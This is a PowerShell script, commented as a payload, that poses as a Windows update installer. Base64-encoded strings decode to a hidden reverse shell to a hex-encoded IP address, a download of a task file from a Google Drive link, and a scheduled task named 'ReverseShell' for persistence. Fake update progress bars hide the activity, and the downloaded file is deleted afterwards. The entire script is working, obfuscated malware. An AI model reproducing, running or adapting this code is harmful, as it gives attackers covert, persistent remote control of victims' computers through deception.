# Payload
$nkIu2 = "U3RhcnQtUHJvY2VzcyAkUFNIT01FXHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3Qgey1lcCBieXBhc3MgLW5vcCAkVEt4dkZNenlFMSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMHhjMGE4Y2M4MCcsMHgxZjkwKTskQzNZS3F3N0RDNyA9ICRUS3h2Rk16eUUxLkdldFN0cmVhbSgpO1tieXRlW11dJE9tekpkV05ISmQgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkVXJvbWc1WTZ3aSA9ICRDM1lLcXc3REM3LlJlYWQoJE9tekpkV05ISmQsIDAsICRPbXpKZFdOSEpkLkxlbmd0aCkpIC1uZSAwKXs7JHNxd3NFWlg3bmggPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRPbXpKZFdOSEpkLDAsICRVcm9tZzVZNndpKTskOW1UWHRmVGlIUyA9IChpJydleCAkc3F3c0VaWDduaCAyPiYxIHwgT3V0LVN0cmluZyApOyQ0ZjdKcVdHZ3YxID0gJDltVFh0ZlRpSFMrICc8OlFjY2tDZ0U4UVI6PiAnICsgKHB3ZCkuUGF0aCArICc+ICc7JEtKU3BGQnBuVzEgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJDRmN0pxV0dndjEpOyRDM1lLcXc3REM3LldyaXRlKCRLSlNwRkJwblcxLDAsJEtKU3BGQnBuVzEuTGVuZ3RoKTskQzNZS3F3N0RDNy5GbHVzaCgpfTskVEt4dkZNenlFMS5DbG9zZSgpfSAtV2luZG93U3R5bGUgSGlkZGVu"
$qQdFm = "SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9kcml2ZS51c2VyY29udGVudC5nb29nbGUuY29tL2Rvd25sb2FkP2lkPTFvNWxaaUdLWlZjTWEzdVItRWRjYjlhVjFNVUJSNjhKUiZleHBvcnQ9ZG93bmxvYWQmYXV0aHVzZXI9MSZjb25maXJtPXQmdXVpZD01NGZkMjFmZS1hOWY2LTRiYjctYTRhNi0xMmUwNTVkOTkxNmEmYXQ9QU83aDA3Y211dmN1bkRqQndpVlotRk1OOXcxMiUzQTE3MjQ3ODI5Nzg3MzEiIC1PdXRGaWxlICIkZW52OlRFTVBcdGFzay54bWwi"
$CkN2j = "c2NodGFza3MgL2NyZWF0ZSAvdG4gIlJldmVyc2VTaGVsbCIgL3htbCAiJGVudjpURU1QXHRhc2sueG1sIiAvZiA+ICRudWxsIDI+JjEK"
$dkYwT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($nkIu2))
$JcPbZ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qQdFm))
$DiHlO = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($CkN2j))

# Fake Progress Bar
function Show-FakeProgress {
    param (
        [int]$Start = 1,
        [int]$End = 10,
        [int]$Delay = 100
    )

    for ($i = $Start; $i -le $End; $i++) {
        Write-Progress -Activity "Installing Updates" -Status "$i% Complete" -PercentComplete $i
        Start-Sleep -Milliseconds $Delay
    }
}

# Fake Windows Update Steps
Write-Host "" | Out-Null
Start-Sleep -Seconds 2
Write-Host "Preparing to install updates..." | Out-Null
Start-Sleep -Seconds 3
Write-Host "Downloading updates..." | Out-Null
Start-Sleep -Seconds 5
Write-Host "Installing updates..." | Out-Null

# Payload Execution
$pUjro = $dkYwT | powershell -nop -
Show-FakeProgress -Start 1 -End 27 -Delay 100
$dSuiV = $JcPbZ | powershell -nop -
Show-FakeProgress -Start 28 -End 82 -Delay 100
$CwLiq = $DiHlO | powershell -nop -
Show-FakeProgress -Start 83 -End 100 -Delay 100

Remove-Item "$env:TEMP\task.xml" -Force

Write-Host "Updates installed successfully!" -ForegroundColor Green
Start-Sleep -Seconds 1
